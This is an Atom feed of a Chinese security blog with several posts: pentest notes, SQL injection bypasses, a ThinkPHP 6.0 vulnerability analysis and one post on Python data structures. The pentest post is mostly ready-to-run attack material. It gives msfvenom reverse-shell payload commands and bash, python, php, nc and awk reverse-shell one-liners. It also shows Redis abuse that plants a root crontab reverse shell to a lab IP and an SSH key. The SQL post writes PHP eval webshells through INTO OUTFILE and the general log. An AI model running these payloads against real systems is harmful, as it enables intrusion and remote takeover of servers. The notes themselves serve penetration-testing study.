<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://prontosil.com/"/>
  <updated>2020-03-19T15:05:16.247Z</updated>
  <id>http://prontosil.com/</id>
  
  <author>
    <name>prontosil</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSRF相关总结</title>
    <link href="http://prontosil.com/posts/f70b79f3/"/>
    <id>http://prontosil.com/posts/f70b79f3/</id>
    <published>2020-03-19T07:27:00.000Z</published>
    <updated>2020-03-19T15:05:16.247Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="22dc0f3da78fb41a0642cea5c22b4034ef8b79d113d1dd60e9a2eb3777515eb0"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CSRF" scheme="http://prontosil.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透常见知识</title>
    <link href="http://prontosil.com/posts/6941c9ee/"/>
    <id>http://prontosil.com/posts/6941c9ee/</id>
    <published>2020-03-18T01:09:58.000Z</published>
    <updated>2020-03-18T08:31:08.179Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令"></a>msf常用命令</h2><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>参数：</p><ul><li><p><code>-l</code> 列出相关的值，这些值包括 <code>payloads, encoders, nops, platforms, archs, encrypt, formats, all</code></p></li><li><p><code>-b</code> badchar 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中</p></li><li><p><code>-e</code> 开启payload编码</p></li></ul><pre><code>msfvenom -l encoders 列出所有的编码器</code></pre><p>其中比较强大的有：</p><p><code>x86/shikata_ga_nai, cmd/powershell_base64</code></p><ul><li><code>-i</code> 指定编码次数</li><li><code>-x</code> 指定一个特定的可执行文件作为模板，常与 <code>-k</code> 联合使用，保护模板程序的功能，注入的payload作为一个新的进程运行</li><li><code>-n</code> 指定填充的nop数量</li></ul><h3 id="常用payload生成命令"><a href="#常用payload生成命令" class="headerlink" title="常用payload生成命令"></a>常用payload生成命令</h3><p>Windows (避免坏字节的出现)</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcpLHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o payload.exe</code></pre><p>Android</p><pre><code>//需要签名msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk</code></pre><p>powershell</p><pre><code>msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</code></pre><p>Linux</p><pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf</code></pre><p>php</p><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw &gt; shell.php</code></pre><p>war</p><pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw - o payload.war</code></pre><p>war包和jar包区别：</p><blockquote><p>war包是java web打的包，可以直接丢到tomcat的webapp目录下运行，jar包是java应用程序打的包，像spring boot打包就是jar，因为内置了web服务器</p></blockquote><p>python</p><pre><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py</code></pre><p>Windows shellcode</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><p>Linux shellcode</p><pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><h2 id="常用反弹shell"><a href="#常用反弹shell" class="headerlink" title="常用反弹shell"></a>常用反弹shell</h2><p>github项目：<a href="https://github.com/m0rph-1/revshellgen" target="_blank" rel="noopener">https://github.com/m0rph-1/revshellgen</a> 可以很方便地生成各种形式的反弹shell命令</p><p>bash反弹shell</p><pre><code>~/revshellgen (master ✔) ᐅ python revshellgen.py -i 127.0.0.1 -p 1234 -t bash[+] Reverse shell command:bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</code></pre><p>python反弹shell</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>php反弹shell</p><pre><code>php -r &#39;$sock=fsockopen(&quot;127.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p>nc反弹shell</p><pre><code>ncat 127.0.0.1 1234 -e /bin/shrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 1234 &gt;/tmp/f</code></pre><p>awk反弹shell</p><pre><code>awk &#39;BEGIN {s = &quot;/inet/tcp/0/127.0.0.1/1234&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null</code></pre><p>nc-pipe</p><pre><code>/bin/sh | nc 127.0.0.1 1234</code></pre><h2 id="tomcat常见漏洞"><a href="#tomcat常见漏洞" class="headerlink" title="tomcat常见漏洞"></a>tomcat常见漏洞</h2><h3 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h3><p><code>/conf/web.xml</code> 文件中的readonly为false</p><pre><code>&lt;init-param&gt;    &lt;param-name&gt;readonly&lt;/param-name&gt;    &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;</code></pre><p>之后就可以通过PUT方式上传文件，但是 <code>.jsp</code> 的后缀会被限制</p><p>绕过方式：</p><ul><li>Windows文件名加空格 <code>PUT /x.jsp%20 HTTP/1.1</code> 上传之后在Windows下空格会被去掉</li><li>NTFS流， <code>PUT /x.jsp::$DATA HTTP/1.1</code></li><li><code>/</code>在文件名中是非法的，也会被去除（Linux/Windows) <code>PUT /x.jsp/ HTTP/1.1</code></li></ul><h3 id="tomcat-后台部署war包漏洞"><a href="#tomcat-后台部署war包漏洞" class="headerlink" title="tomcat 后台部署war包漏洞"></a>tomcat 后台部署war包漏洞</h3><p><code>tomcat-users.xml</code> 修改配置</p><pre><code>&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;role rolename=&quot;admin-gui&quot;/&gt;&lt;user username=&quot;tomcat&quot; password=&quot;admin&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;&lt;user username=&quot;both&quot; password=&quot;admin&quot; roles=&quot;tomcat,role1&quot;/&gt;&lt;user username=&quot;role1&quot; password=&quot;admin&quot; roles=&quot;role1&quot;/&gt;</code></pre><p>之后访问到 <code>http://127.0.0.1:8080/manager</code></p><p>写一个shell.jsp，打包之后改名为war包上传即可getshell(也可以用msf生成一个war包)</p><h3 id="tomcat目录遍历"><a href="#tomcat目录遍历" class="headerlink" title="tomcat目录遍历"></a>tomcat目录遍历</h3><p><code>web.xml</code> 中如果 <code>listings</code> 参数为true，导致目录遍历漏洞</p><p><img src="/posts/6941c9ee/1584495111390.png" alt> </p><h2 id="redis常见漏洞"><a href="#redis常见漏洞" class="headerlink" title="redis常见漏洞"></a>redis常见漏洞</h2><p>给你一个未授权访问redis，你能做啥？</p><h3 id="redis写shell"><a href="#redis写shell" class="headerlink" title="redis写shell"></a>redis写shell</h3><pre><code>config set dir /var/www/htmlconfig set dbfilename redis.phpset webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;save</code></pre><h3 id="写crontab反弹shell"><a href="#写crontab反弹shell" class="headerlink" title="写crontab反弹shell"></a>写crontab反弹shell</h3><p>在redis以root权限运行时可以写crontab来执行命令反弹shell</p><pre><code>root@kali:~# redis-cli -h 192.168.63.130192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;OK192.168.63.130:6379&gt; config set dir /var/spool/cron/OK192.168.63.130:6379&gt; config set dbfilename rootOK192.168.63.130:6379&gt; saveOK</code></pre><h3 id="写ssh-keygen公钥"><a href="#写ssh-keygen公钥" class="headerlink" title="写ssh-keygen公钥"></a>写ssh-keygen公钥</h3><p>在以下条件下，可以利用此方法</p><ol><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ol><p><code>ssh-keygen -t rsa</code> 生成一对公私钥</p><p>然后redis执行命令，注意写入的公钥必须要前后分别加个换行</p><pre><code>192.168.63.130:6379&gt; config set dir /root/.ssh/OK192.168.63.130:6379&gt; config set dbfilename authorized_keysOK192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;OK192.168.63.130:6379&gt; saveOK</code></pre><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h2 id="phpmyadmin常见漏洞"><a href="#phpmyadmin常见漏洞" class="headerlink" title="phpmyadmin常见漏洞"></a>phpmyadmin常见漏洞</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/256#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/256#toc-2</a></p><p><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;msf常用命令&quot;&gt;&lt;a href=&quot;#msf常用命令&quot; class=&quot;headerlink&quot; title=&quot;msf常用命令&quot;&gt;&lt;/a&gt;msf常用命令&lt;/h2&gt;&lt;h3 id=&quot;msfvenom&quot;&gt;&lt;a href=&quot;#msfvenom&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网" scheme="http://prontosil.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Laravel POP链讲解</title>
    <link href="http://prontosil.com/posts/898eeda9/"/>
    <id>http://prontosil.com/posts/898eeda9/</id>
    <published>2020-03-18T00:27:16.000Z</published>
    <updated>2020-03-18T00:45:48.519Z</updated>
    
    <content type="html"><![CDATA[<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=90514239&cid=154578272&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="480" width="780"> </iframe></div>]]></content>
    
    <summary type="html">
    
      
      
        

&lt;div style=&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;&gt;
&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=90514239
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="POP" scheme="http://prontosil.com/tags/POP/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入总结</title>
    <link href="http://prontosil.com/posts/9b13a55/"/>
    <id>http://prontosil.com/posts/9b13a55/</id>
    <published>2020-03-17T14:35:41.000Z</published>
    <updated>2020-03-18T07:57:35.403Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用的绕过手段"><a href="#常用的绕过手段" class="headerlink" title="常用的绕过手段"></a>常用的绕过手段</h2><h3 id="字符型过滤单引号"><a href="#字符型过滤单引号" class="headerlink" title="字符型过滤单引号"></a>字符型过滤单引号</h3><ul><li>字符串转换函数绕过</li></ul><pre><code>char()</code></pre><ul><li>十六进制数绕过</li></ul><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><p>between, like, &lt;, &gt;，regexp 绕过</p><pre><code>1 union select 1, table_name from information_schema.tables where table_name = &#39;users&#39;select 1, table_name from information_schema.tables where table_name between &#39;u&#39; and &#39;v&#39;;select 1, table_name from information_schema.tables where table_name like &#39;u%&#39;;</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号</p><pre><code>select substr(database() from 1 for 1);select mid(database() from 1 for 1);</code></pre><p>使用join(连接表的查询结果)</p><pre><code class="sql">union select 1,2     #等价于union select * from (select 1)a join (select 2)bmysql&gt; SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e);+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+1 row in set (0.00 sec)</code></pre><p>使用like</p><pre><code class="sql">select ascii(mid(user(),1,1))=80   #等价于select user() like &#39;r%&#39;mysql&gt; select user() like &#39;r%&#39;;+------------------+| user() like &#39;r%&#39; |+------------------+|                1 |+------------------+1 row in set (0.00 sec)</code></pre><p>对于 <code>limit</code> 可以使用 offset绕过</p><pre><code class="sql">select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0</code></pre><h3 id="lt-，-gt-被过滤"><a href="#lt-，-gt-被过滤" class="headerlink" title="&lt;，&gt;被过滤"></a>&lt;，&gt;被过滤</h3><ul><li>greatest函数绕过</li></ul><blockquote><p>greatest(a,b)，返回a和b中较大的那个数</p></blockquote><pre><code># 猜解user()第一个字符的ascii码是否小于等于150时ascii(mid(user(),1,1)) &lt;= 150=greatest(ascii(mid(user(),1,1)), 150)=150;</code></pre><h3 id="过滤and，or可以使用-amp-amp-和"><a href="#过滤and，or可以使用-amp-amp-和" class="headerlink" title="过滤and，or可以使用&amp;&amp;和||"></a>过滤and，or可以使用&amp;&amp;和||</h3><h3 id="单引号逃逸"><a href="#单引号逃逸" class="headerlink" title="单引号逃逸"></a>单引号逃逸</h3><ul><li>\</li></ul><pre><code># 用户名为usernameSQL&gt; select * from db where name=&#39;username\&#39; and passwd=&#39; or 1=1#</code></pre><h3 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>利用数值计算盲注或时间盲注</p><pre><code>|| ascii(mid(user(),1,1) ) = 97 %23</code></pre><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>数据库如下</p><pre><code>mysql&gt; select * from user;+----+----------+----------------------------------+| id | username | password                         |+----+----------+----------------------------------+|  1 | zz       | 25ed1bcb423b0b7200f485fc5ff71c8e |+----+----------+----------------------------------+1 row in set (0.00 sec)</code></pre><p>测试</p><pre><code>mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 20) and sleep(2);Empty set (2.00 sec)mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 89) and sleep(2);Empty set (0.00 sec)</code></pre><p>我们这么来理解多语句的and</p><p>数据库会每次取出一行数据，然后做判断，首先 <code>id=1</code> 成立，然后 判断<code>(select hex(substr(database(), 1,1)) &gt; 20)</code> </p><p>如果这个成立，就会执行接下来的 <code>sleep(2)</code> 如果不成立，那么直接over了。不会有延时</p><h2 id="MySQL利用方式"><a href="#MySQL利用方式" class="headerlink" title="MySQL利用方式"></a>MySQL利用方式</h2><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><h4 id="联合查询写shell"><a href="#联合查询写shell" class="headerlink" title="联合查询写shell"></a>联合查询写shell</h4><pre><code>UNION+ALL+SELECT+1,2,’&lt;? phpinfo(); ?&gt;’ into outfile ‘G:/2.txt’ %23</code></pre><h4 id="非联合查询写shell"><a href="#非联合查询写shell" class="headerlink" title="非联合查询写shell"></a>非联合查询写shell</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 into outfile ‘G:/2.txt’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23</code></pre><h4 id="使用日志写shell"><a href="#使用日志写shell" class="headerlink" title="使用日志写shell"></a>使用日志写shell</h4><pre><code class="p">set global general_log = on;开启日志监测，一般是关闭的，如果一直开，文件会很大的。set global general_log_file = ‘G:/2.txt’;这里设置我们需要写入的路径就可以了。select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;查询一个一句话，这个时候log日志里就会记录这个。set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;结束后，再修改为原来的路径。set global general_log = off;关闭下日志记录。</code></pre><h4 id="延时注入写shell"><a href="#延时注入写shell" class="headerlink" title="延时注入写shell"></a>延时注入写shell</h4><pre><code>select sleep(2),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;d:\\success.txt&#39;;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;常用的绕过手段&quot;&gt;&lt;a href=&quot;#常用的绕过手段&quot; class=&quot;headerlink&quot; title=&quot;常用的绕过手段&quot;&gt;&lt;/a&gt;常用的绕过手段&lt;/h2&gt;&lt;h3 id=&quot;字符型过滤单引号&quot;&gt;&lt;a href=&quot;#字符型过滤单引号&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="SQL注入" scheme="http://prontosil.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>python数据结构</title>
    <link href="http://prontosil.com/posts/7f8e2ad4/"/>
    <id>http://prontosil.com/posts/7f8e2ad4/</id>
    <published>2020-03-17T13:29:33.000Z</published>
    <updated>2020-03-17T14:14:47.958Z</updated>
    
    <content type="html"><![CDATA[<p>补充一个小知识</p><p>python 输入重定向为文件</p><pre><code>import syssys.stdin = open(&quot;test.txt&quot;)</code></pre><p>之后就可以直接从文件读入，不需要手动输入了</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><pre><code>实现链表输入1 3 5 4 1 9 4 将其存储为链表格式</code></pre><p>链表数据结构：</p><pre><code class="python">class ListNode:    def __init__(self, x=-1):        self.val = x        self.next = None</code></pre><h3 id="创建链表，返回头节点-尾插法"><a href="#创建链表，返回头节点-尾插法" class="headerlink" title="创建链表，返回头节点 (尾插法)"></a>创建链表，返回头节点 (尾插法)</h3><pre><code class="python">def creat_list(line:list) -&gt; ListNode:    root = ListNode()    tail = root    for i in line:        temp = ListNode(i)        tail.next = temp        tail = tail.next      return root.next</code></pre><h3 id="遍历链表"><a href="#遍历链表" class="headerlink" title="遍历链表"></a>遍历链表</h3><pre><code class="python">def traverse_list(root:ListNode):    &#39;&#39;&#39;    遍历链表，没有头节点    &#39;&#39;&#39;    temp = root    while temp:        print(temp.val+&quot; &quot;,end=&quot;&quot;)        temp = temp.next    print()</code></pre><h3 id="删除倒数第n个节点，一次遍历"><a href="#删除倒数第n个节点，一次遍历" class="headerlink" title="删除倒数第n个节点，一次遍历"></a>删除倒数第n个节点，一次遍历</h3><p>用两个指针指向，第一个指针先走 <code>n+1</code> 步，中间空出n个节点，然后删除即可</p><pre><code class="python">def removeNthFromEnd(head:ListNode, n:int)-&gt;ListNode:    &#39;&#39;&#39;    一次遍历算法    &#39;&#39;&#39;    new_head = ListNode(-1)    new_head.next = head    first = new_head    second = new_head    for i in range(n+1):        first = first.next        while first != None:        first = first.next        second = second.next    second.next = second.next.next    return new_head.next</code></pre><h3 id="向右旋转链表"><a href="#向右旋转链表" class="headerlink" title="向右旋转链表"></a>向右旋转链表</h3><p>就是把单链表组成一个循环链表</p><pre><code class="python">def rotateRight(head:ListNode, k:int)-&gt;ListNode:    &#39;&#39;&#39;    针对链表进行旋转    &#39;&#39;&#39;    if k == 0:        return head    if head == None:        return head    temp = head    length = 0    while temp.next != None:        length += 1        temp = temp.next    length += 1    temp.next = head    temp = head    for i in range((length - k%length -1)):        temp = temp.next    new_head = temp.next    temp.next = None    return new_head</code></pre><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="创建图"><a href="#创建图" class="headerlink" title="创建图"></a>创建图</h3><p>采用邻接表进行存储， <code>ArcNode</code> 代表邻接点， <code>VNode</code> 代表边节点</p><pre><code class="python">class ArcNode:    def __init__(self,adjvex, weight):        self.adjvex = adjvex        self.weight = weight        self.next = Noneclass VNode:    def __init__(self):        self.next = None</code></pre><p>输入数据</p><pre><code>输入格式：4 40 1 1 01 0 1 01 1 0 11 1 1 1</code></pre><p>读入数据，创建邻接矩阵</p><pre><code class="python">def create_table()-&gt;list:    m,n = [int(i) for i in input().split()] # 自动解包    A = [0 for i in range(m)]    for i in range(m):        A[i] = [int(j) for j in input().split()]    return A</code></pre><p>邻接矩阵转换为邻接表</p><pre><code class="python">def create_Adj(A)-&gt;list:    &#39;&#39;&#39;    邻接矩阵转换为邻接表    &#39;&#39;&#39;    G = [VNode() for i in range(len(A))]    for i,vex in enumerate(A):        # 第i个节点，及其所有的边        for node,j in enumerate(vex):            if j != 0:                p = ArcNode(node, j)                p.next = G[i].next                G[i].next = p    return G</code></pre><p>打印邻接表</p><pre><code class="python">def disp_adj(G):    for index,i in enumerate(G):        p = i.next        print(index, end=&quot;&quot;)        while p != None:            print(&quot; {}-&gt;&quot;.format(p.adjvex), end=&quot;&quot;)            p = p.next        print()</code></pre><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><pre><code class="python">visited = [0 for i in range(4)]def DFS(G, v):    &#39;&#39;&#39;    深度优先搜索    &#39;&#39;&#39;    visited[v] = 1    print(v, end=&quot;&quot;)    p = G[v].next    while p != None:        w = p.adjvex        if visited[w] == 0:            DFS(G,w)        p = p.next    print()</code></pre><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><pre><code class="python">def BFS(G, v):    &#39;&#39;&#39;    广度优先搜索    &#39;&#39;&#39;    q = Queue()    visited = [0 for i in range(len(G))]    print(v,end=&quot;&quot;)    visited[v] = 1    q.put(v)    while not q.empty():        w = q.get()        p = G[w].next        while p!=None:            if visited[p.adjvex] == 0:                print(p.adjvex, end=&quot;&quot;)                visited[p.adjvex] = 1                q.put(p.adjvex)            p = p.next    print()</code></pre><h3 id="Dijkstar-算法"><a href="#Dijkstar-算法" class="headerlink" title="Dijkstar 算法"></a>Dijkstar 算法</h3><pre><code class="python">def Dijkstra(A, v):    &#39;&#39;&#39;    Dijkstar 算法    &#39;&#39;&#39;    for i in A:        for index,value in enumerate(i):            if value == -1:                i[index] = sys.maxsize    dist = A[v] # 原始v到各个顶点的距离    path = [0 for i in range(len(A))]     for i in range(len(A)):        if A[v][i] != -1:            path[i] = v        else:            path[i] = -1    s = [0 for i in range(len(A))]    s[v] = 1    for i in range(len(A)):        mindis = sys.maxsize        # 寻找最小路径长度顶点u        for j in range(len(A)):            if s[j] == 0  and dist[j] &lt; mindis:                u = j                mindis = dist[j]        s[u] = 1        for j in range(len(A)):            if s[j] == 0:                if A[u][j] &lt; sys.maxsize and dist[j] &gt; 0 and dist[u]+A[u][j] &lt; dist[j]:                    dist[j] = dist[u] + A[u][j]                    path[j] = u    return path, dist</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;补充一个小知识&lt;/p&gt;
&lt;p&gt;python 输入重定向为文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import sys

sys.stdin = open(&amp;quot;test.txt&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后就可以直接从文件读入，不需要手动输入了&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://prontosil.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp6.0漏洞分析</title>
    <link href="http://prontosil.com/posts/314a66d3/"/>
    <id>http://prontosil.com/posts/314a66d3/</id>
    <published>2020-03-17T12:33:18.000Z</published>
    <updated>2020-03-17T14:14:47.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="通过session写文件"><a href="#通过session写文件" class="headerlink" title="通过session写文件"></a>通过session写文件</h2><p>漏洞点位于：<code>/think/session/Store.php</code></p><pre><code class="php">    /**     * session_id设置     * @access public     * @param string $id session_id     * @return void     */    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>针对sessionid的校验不严</p><p><img src="/posts/314a66d3/1584448906099.png" alt></p><p>之后初始化session</p><p><img src="/posts/314a66d3/1584448927094.png" alt></p><p>保存session的过程： <code>think/session/Store.php</code></p><pre><code class="php">    /**     * 保存session数据     * @access public     * @return void     */    public function save(): void    {        $this-&gt;clearFlashData();        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>进入到 <code>write</code> 函数写入</p><p>最后存储到文件中</p><p><img src="/posts/314a66d3/1584449025846.png" alt></p><p>这样，如果我能控制session的数组中的某个值，就能直接写入shell</p><p>成功写入：</p><p><img src="/posts/314a66d3/1584449183704.png" alt></p><h2 id="6-0-POP链分析"><a href="#6-0-POP链分析" class="headerlink" title="6.0 POP链分析"></a>6.0 POP链分析</h2><p>入口</p><p><img src="/posts/314a66d3/1584451502585.png" alt></p><p>进入 <code>save</code> 函数</p><p><img src="/posts/314a66d3/1584451535191.png" alt></p><p>继续步入</p><p><img src="/posts/314a66d3/1584451560678.png" alt></p><p>进入到 <code>cleanContents</code> 函数，直接返回原值(没有过滤因为不是多维数组)</p><pre><code class="php">    public function cleanContents(array $contents)    {        $cachedProperties = array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path =&gt; $object) {            if (is_array($object)) {                $contents[$path] = array_intersect_key($object, $cachedProperties);            }        }        return $contents;    }</code></pre><p>返回</p><p><img src="/posts/314a66d3/1584451622290.png" alt></p><p>跟进 <code>set</code> 函数，这里的 <code>$this-&gt;store</code> 已经被覆盖为 File 类</p><p><img src="/posts/314a66d3/1584451656966.png" alt></p><p><img src="/posts/314a66d3/1584451671730.png" alt></p><p>最后有两个利用方式：</p><ol><li><pre><code class="php"> protected function serialize($data): string {     if (is_numeric($data)) {         return (string) $data;     }     $serialize = $this-&gt;options[&#39;serialize&#39;][0] ?? &quot;\Opis\Closure\serialize&quot;;     return $serialize($data); }</code></pre></li></ol><ol start="2"><li><p>利用伪协议任意文件写入</p></li></ol><p><img src="/posts/314a66d3/1584451721156.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;通过session写文件&quot;&gt;&lt;a href=&quot;#通过session写文件&quot; class=&quot;headerlink&quot; title=&quot;通过session写文件&quot;&gt;&lt;/a&gt;通过session写文件&lt;/h2&gt;&lt;p&gt;漏洞点位于：&lt;code&gt;/think/session/Sto
      
    
    </summary>
    
    
